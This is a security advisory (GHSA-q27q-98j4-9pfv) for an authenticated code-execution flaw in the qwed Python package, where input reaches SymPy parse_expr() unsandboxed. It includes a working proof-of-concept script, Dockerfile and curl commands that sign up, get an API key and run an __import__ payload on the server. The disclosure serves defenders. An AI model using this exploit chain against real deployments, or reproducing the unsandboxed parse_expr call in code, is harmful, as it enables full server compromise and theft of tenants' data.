# [H] qwed Vulnerable to Authenticated Remote Code Execution via Unsafe SymPy `parse_expr()`

## Summary
Severity: High
Advisory: GHSA-q27q-98j4-9pfv
CVE: CVE-2026-55585
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-q27q-98j4-9pfv
Type: github-advisory

## Affected
- PyPI: `qwed` — affected >=0 <5.1.2

## Details
### Summary

The `qwed` package (version 5.1.1) passes attacker-controlled input directly to SymPy's `parse_expr()` function without a restricted namespace. Because `parse_expr()` internally calls Python's `eval()`, any authenticated tenant can execute arbitrary Python code inside the API server process. The attack requires only a standard user account, which is freely obtainable through the default-enabled `/auth/signup` endpoint. Successful exploitation gives the attacker full read/write access to the filesystem and the ability to execute operating system commands, resulting in complete server compromise.

### Details

The vulnerability exists in two independently reachable code paths:

**Primary sink — `POST /verify/math`**

`src/qwed_new/api/main.py:442` defines the `/verify/math` route, protected only by `get_current_tenant` (line 444), which accepts any valid tenant API key. The request body field `expression` is read at line 463 and passed through a cosmetic regex normalization at line 495 (`re.sub(r'(\d)(\()', r'\1*\2', expression)`) that performs no security validation. The normalized string is then passed directly to `parse_expr()` at line 504:

```python
# src/qwed_new/api/main.py
expression = request.get("expression")
...
expression_normalized = re.sub(r'(\d)(\()', r'\1*\2', expression)
...
parsed = parse_expr(expression_normalized)   # line 504 — unsandboxed eval
```

**Secondary sink — `POST /verify/batch`**

`src/qwed_new/api/main.py:1481` defines the `/verify/batch` route. Batch items flow through `batch_service.create_job()` (line 1517) into `batch.py:132` where `item.query` is stored verbatim, then processed by `_verify_item()` (line 167). When the item type is `VerificationType.MATH` (line 222), the expression is passed to `parse_expr()` at line 239 with no sanitization:

```python
# src/qwed_new/core/batch.py
expression = item.query
...
parsed = parse_expr(expression)              # line 239 — unsandboxed eval
```

`parse_expr()` accepts a `global_dict` and `local_dict` parameter that, when set to `{"__builtins__": {}}` and an allowlist respectively, restrict what names are accessible during evaluation. Neither call site sets these parameters, leaving the full Python built-in namespace available to the attacker.

### PoC

**Environment setup (Docker)**

```bash
# Build from repository root (one level above vuln-001/)
docker build -t qwed-vuln-001 -f vuln-001/Dockerfile .

# Run the server (binds to localhost:8765)
docker run -d -p 127.0.0.1:8765:8765 --name qwed-vuln-001 qwed-vuln-001
```

The Dockerfile installs `qwed` from the local repository source with all dependencies and starts the server with the following environment:

- `QWED_JWT_SECRET_KEY=test-jwt-secret-abcdefghijklmnopqrstuvwxyz0123456789`
- `API_KEY_SECRET=test-api-key-secret-abcdefghijklmnopqrstuvwxyz0123456789`
- `QWED_CORS_ORIGINS=http://localhost`
- `QWED_SKIP_ENV_INTEGRITY_CHECK=true`
- `DATABASE_URL=sqlite:////tmp/qwed-poc.db`

**Automated exploit (`poc.py`)**

```bash
python3 vuln-001/poc.py --host 127.0.0.1 --port 8765
```

The script performs three steps:

1. **Register an account** — `POST /auth/signup` with arbitrary email/password/organization (no invite code or admin approval required).
2. **Obtain an API key** — `POST /auth/api-keys` using the JWT returned from signup.
3. **Send the RCE payload** — `POST /verify/math` with the `x-api-key` header and the expression:

```
__import__('pathlib').Path('/tmp/qwed_parse_expr_rce').write_text('pwned_by_parse_expr_rce')
```

**Expected output**

```
[+] Server is ready.
[+] Account created; JWT bearer token obtained.
[+] API key (first 20 chars): qwed_live_WwNm86Fpnh...
[*] expression = __import__('pathlib').Path('/tmp/qwed_parse_expr_rce').write_text('pwned_by_parse_expr_rce')
[*] HTTP status : 200
[*] HTTP response: {"is_valid": true, "value": 23.0, "simplified": "23", "original": "23"}
[PASS] HTTP 200 returned — payload evaluated without error.
```

The server returns HTTP 200 and `{"value": 23.0}` — the return value of `write_text()` (23 bytes written), cast by SymPy to `Integer(23)`. This proves the Python expression was executed inside the server process.

**Decisive verification**

```bash
docker exec qwed-vuln-001 cat /tmp/qwed_parse_expr_rce
# Expected: pwned_by_parse_expr_rce
```

The same technique applies to `POST /verify/batch` by submitting a batch job with a math item whose `query` field contains the payload; a separate marker file `/tmp/qwed_batch_parse_expr_rce` was also confirmed during dynamic testing.

**Manual curl reproduction (no Python script)**

```bash
# Step 1: sign up and capture JWT
TOKEN=$(curl -sS -X POST http://127.0.0.1:8765/auth/signup \
  -H 'Content-Type: application/json' \
  -d '{"email":"poc@example.com","password":"Password123!","organization_name":"poc-org"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

# Step 2: create API key
APIKEY=$(curl -sS -X POST http://127.0.0.1:8765/auth/api-keys \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"poc"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["key"])')

# Step 3: send payload
rm -f /tmp/qwed_parse_expr_rce
curl -sS -X POST http://127.0.0.1:8765/verify/math \
  -H 'Content-Type: application/json' \
  -H "x-api-key: $APIKEY" \
  -d '{"expression":"__import__('"'"'pathlib'"'"').Path('"'"'/tmp/qwed_parse_expr_rce'"'"').write_text('"'"'owned'"'"')"}'

# Step 4: confirm file was written by the server process
cat /tmp/qwed_parse_expr_rce
# Expected: owned
```

### Impact

This is an **Authenticated Remote Code Execution** vulnerability. Any user who can create a tenant account (which is possible by default, since `/auth/signup` requires no invitation or administrator approval) can execute arbitrary Python code inside the API server process with the privileges of the server's operating system user.

Concrete impact includes:

- **Confidentiality** — read any file accessible to the server process (environment variables, secret keys, database contents, source code).
- **Integrity** — write or overwrite any file accessible to the server process, modify database records, plant backdoors.
- **Availability** — terminate the server process, exhaust resources, corrupt persistent storage.

In a shared multi-tenant deployment, a single tenant can compromise the entire server, affecting all other tenants' data. In a containerized deployment, the immediate impact is container-level compromise; lateral movement depends on the container's network and volume configuration.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 Reproduction Environment
# Authenticated RCE via Unsafe SymPy parse_expr() in QWED 5.1.1
#
# Build from the repo root (one level above vuln-001/):
#   docker build -t qwed-vuln-001 -f vuln-001/Dockerfile .
#
# Run:
#   docker run -d -p 127.0.0.1:8765:8765 --name qwed-vuln-001 qwed-vuln-001

FROM python:3.12-slim-bookworm

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1

WORKDIR /app

# Install minimal build dependencies required by some native extensions
RUN apt-get update \
    && apt-get install -y --no-install-recommends gcc g++ \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Copy the repository source
COPY repo/ /app/repo/

# Install hatchling build backend, then install the package with all dependencies
# z3-solver==4.13.3.0 is pinned in pyproject.toml; wheels are available for CPython 3.12
RUN pip install --no-cache-dir --upgrade pip hatchling \
    && pip install --no-cache-dir -e /app/repo

# Runtime environment variables — minimal set required to start the server
ENV QWED_JWT_SECRET_KEY="test-jwt-secret-abcdefghijklmnopqrstuvwxyz0123456789" \
    API_KEY_SECRET="test-api-key-secret-abcdefghijklmnopqrstuvwxyz0123456789" \
    QWED_CORS_ORIGINS="http://localhost" \
    QWED_SKIP_ENV_INTEGRITY_CHECK="true" \
    DATABASE_URL="sqlite:////tmp/qwed-poc.db"

EXPOSE 8765

CMD ["python3", "-m", "uvicorn", "qwed_new.api.main:app", \
     "--host", "0.0.0.0", "--port", "8765", "--log-level", "warning"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
Proof of Concept: Authenticated RCE via Unsafe SymPy parse_expr() — VULN-001

Affected product : QWED 5.1.1 (QWED-AI/qwed-verification)
Endpoint         : POST /verify/math
CWE              : CWE-94 — Improper Control of Code Generation
CVSS             : 8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Root cause:
  src/qwed_new/api/main.py:504 passes attacker-controlled input directly to
  sympy.parsing.sympy_parser.parse_expr() without a restricted global/local
  namespace.  parse_expr() internally calls eval(), so any valid Python
  expression — including __import__() calls — is executed server-side.

Exploit chain:
  1. Register an account via POST /auth/signup   (open to any user by default)
  2. Obtain an API key via POST /auth/api-keys
  3. POST /verify/math with expression=<python code>
     The code runs inside the server process.

Observable evidence:
  - HTTP 200 response (not 4xx/5xx) proves the payload was evaluated
  - A marker file is written inside the container; verify with:
      docker exec <container> cat /tmp/qwed_parse_expr_rce
    Expected content: "pwned_by_parse_expr_rce"

Usage:
  python3 poc.py [--host 127.0.0.1] [--port 8765]
"""

import argparse
import json
import sys
import time

import requests

# Path written inside the server process by the RCE payload
RCE_MARKER_PATH = "/tmp/qwed_parse_expr_rce"
# Content written to the marker file (must not contain quotes)
RCE_MARKER_CONTENT = "pwned_by_parse_expr_rce"


def wait_for_server(base_url: str, timeout: int = 90) -> bool:
    """Poll the server health endpoint until it responds or timeout expires."""
    print(f"[*] Waiting for server at {base_url} (up to {timeout}s)...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{base_url}/health", timeout=2)
            if r.status_code < 500:
                return True
        except requests.exceptions.ConnectionError:
            pass
        time.sleep(2)
    return False


def signup(base_url: str) -> str:
    """
    Create an attacker-controlled account and return the JWT bearer token.
    /auth/signup is enabled by default and requires no prior authorization.
    """
    payload = {
        "email": "poc-attacker@example.com",
        "password": "Attacker1234!",
        "organization_name": "vuln001-attacker-org",
    }
    r = requests.post(f"{base_url}/auth/signup", json=payload, timeout=15)
    if r.status_code == 400 and "already registered" in r.text:
        # Account exists from a previous run; sign in instead
        sign_in_payload = {
            "email": payload["email"],
            "password": payload["password"],
        }
        r = requests.post(f"{base_url}/auth/signin", json=sign_in_payload, timeout=15)
    r.raise_for_status()
    token = r.json()["access_token"]
    return token


def create_api_key(base_url: str, bearer_token: str) -> str:
    """
    Create an API key for the attacker account.
    Returns the plaintext key (shown only once by the API).
    """
    headers = {"Authorization": f"Bearer {bearer_token}"}
    r = requests.post(
        f"{base_url}/auth/api-keys",
        json={"name": "vuln001-poc"},
        headers=headers,
        timeout=15,
    )
    r.raise_for_status()
    return r.json()["key"]


def exploit(base_url: str, api_key: str) -> dict:
    """
    Send the RCE payload to POST /verify/math.

    The expression uses pathlib.Path.write_text() which:
      - Writes RCE_MARKER_CONTENT to RCE_MARKER_PATH inside the server process
      - Returns an integer (bytes written) that parse_expr() can handle without
        raising an exception, making the side-effect transparent to the caller

    The absence of an error and a 200 status code proves code execution.
    """
    expression = (
        f"__import__('pathlib')"
        f".Path('{RCE_MARKER_PATH}')"
        f".write_text('{RCE_MARKER_CONTENT}')"
    )
    headers = {
        "Content-Type": "application/json",
        "x-api-key": api_key,
    }
    r = requests.post(
        f"{base_url}/verify/math",
        json={"expression": expression},
        headers=headers,
        timeout=20,
    )
    content_type = r.headers.get("content-type", "")
    body = r.json() if "application/json" in content_type else r.text
    return {"status_code": r.status_code, "body": body}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC for VULN-001: Authenticated RCE via SymPy parse_expr() in QWED 5.1.1"
    )
    parser.add_argument("--host", default="127.0.0.1", help="API server host")
    parser.add_argument("--port", type=int, default=8765, help="API server port")
    args = parser.parse_args()

    base_url = f"http://{args.host}:{args.port}"

    # ── Step 0: wait for server ──────────────────────────────────────────────
    if not wait_for_server(base_url):
        print("[FAIL] Server did not become ready within the timeout.")
        sys.exit(1)
    print("[+] Server is ready.\n")

    # ── Step 1: sign up ──────────────────────────────────────────────────────
    print("[*] Step 1/3: Creating attacker account via POST /auth/signup")
    bearer_token = signup(base_url)
    print("[+] Account created; JWT bearer token obtained.\n")

    # ── Step 2: API key ──────────────────────────────────────────────────────
    print("[*] Step 2/3: Obtaining API key via POST /auth/api-keys")
    api_key = create_api_key(base_url, bearer_token)
    print(f"[+] API key (first 20 chars): {api_key[:20]}...\n")

    # ── Step 3: exploit ──────────────────────────────────────────────────────
    rce_expression = (
        f"__import__('pathlib')"
        f".Path('{RCE_MARKER_PATH}')"
        f".write_text('{RCE_MARKER_CONTENT}')"
    )
    print("[*] Step 3/3: Sending RCE payload to POST /verify/math")
    print(f"    expression = {rce_expression}\n")

    result = exploit(base_url, api_key)

    print(f"[*] HTTP status : {result['status_code']}")
    print(f"[*] HTTP response:\n{json.dumps(result['body'], indent=2)}\n")

    if result["status_code"] == 200:
        print("=" * 60)
        print("[PASS] HTTP 200 returned — payload evaluated without error.")
        print(f"       The server wrote '{RCE_MARKER_CONTENT}' to {RCE_MARKER_PATH}")
        print()
        print("       Verify decisive evidence inside the container:")
        print(f"         docker exec qwed-vuln-001 cat {RCE_MARKER_PATH}")
        print("=" * 60)
        sys.exit(0)
    else:
        print(f"[FAIL] Unexpected HTTP {result['status_code']} — exploit did not succeed.")
        sys.exit(2)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/QWED-AI/qwed-verification/security/advisories/GHSA-q27q-98j4-9pfv
- https://github.com/QWED-AI/qwed-verification/pull/200
- https://github.com/QWED-AI/qwed-verification/commit/6066b68c0c4f4cc2c3771824822aaa864d082ef8
- https://github.com/QWED-AI/qwed-verification/commit/dc9d4db72ca4b4ae3f96d0e6a0c27a9e38a06f61
- https://github.com/QWED-AI/qwed-verification
